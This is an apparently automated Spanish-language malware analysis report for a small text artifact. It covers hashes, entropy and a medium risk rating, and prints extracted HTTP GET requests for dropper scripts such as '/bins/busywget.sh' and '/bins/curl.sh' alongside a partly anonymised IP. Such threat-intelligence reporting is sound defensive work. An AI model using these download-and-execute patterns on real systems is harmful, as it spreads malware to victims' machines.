# 🧬 Payload Analysis

`85c0642088358bb06c90008e4655a2fc22fc3db63910594aebb0a869b7189d58`

## 📌 Resumen

Artefacto de 588 B. Formato identificado como ASCII text, with CRLF line terminators. Entropía registrada: 5.20. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Descarga remota, Ejecución. Se identificaron 5 comandos observados o extraídos. Se identificaron 7 indicadores técnicos.


## 🏷️ Clasificación

- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `85c0642088358bb06c90008e4655a2fc22fc3db63910594aebb0a869b7189d58`
- **MD5:** `c6d5bbd70cf33c8f6167ea449b346f8b`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 588 B |
| Entropía | 5.2 |
| Strings | 24 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=7

## 🖥️ Comandos observados / extraídos

```text
GET /bins/busywget.sh HTTP/1.1
User-Agent: curl/7.73.0
GET /bins/wget.sh HTTP/1.1
GET /bins/busycurl.sh HTTP/1.1
GET /bins/curl.sh HTTP/1.1
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 64.89.163.XXX | static_analysis |
| command | GET /bins/busywget.sh HTTP/1.1 | strings |
| command | User-Agent: curl/7.73.0 | strings |
| command | GET /bins/wget.sh HTTP/1.1 | strings |
| command | GET /bins/busycurl.sh HTTP/1.1 | strings |
| command | GET /bins/curl.sh HTTP/1.1 | strings |
| hash | 85c0642088358bb06c90008e4655a2fc22fc3db63910594aebb0a869b7189d58 | static_analysis |
| ip | [internal-ip-redacted] | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
